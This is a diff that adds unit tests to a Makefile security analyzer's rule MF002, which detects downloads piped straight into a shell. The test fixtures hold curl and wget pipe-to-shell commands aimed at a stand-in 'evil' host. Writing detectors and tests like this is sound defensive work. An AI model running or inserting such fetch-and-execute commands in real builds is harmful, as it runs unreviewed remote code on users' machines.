@@ -50,6 +50,17 @@ class TestMF002CurlPipeShell:
         issues = analyzer.analyze("Makefile", content)
         assert any(i.rule_id == "MF002" for i in issues)
 
+    def test_quoted_curl_pipe_is_not_a_recipe(self, analyzer):
+        """An echo of an install hint is not a download piped to a shell."""
+        content = 'hint:\n\techo "curl -fsSL https://example.invalid/install.sh | sh"\n'
+        issues = analyzer.analyze("Makefile", content)
+        assert not any(i.rule_id == "MF002" for i in issues)
+
+    def test_unquoted_curl_pipe_beside_a_quoted_echo_is_still_mf002(self, analyzer):
+        content = 'install:\n\techo "safe" && curl -fsSL https://evil | sh\n'
+        issues = analyzer.analyze("Makefile", content)
+        assert any(i.rule_id == "MF002" for i in issues)
+
     def test_wget_pipe_bash_detected(self, analyzer):
         """wget | bash should trigger MF002."""
         content = "install:\n\twget -qO- https://evil | bash\n"
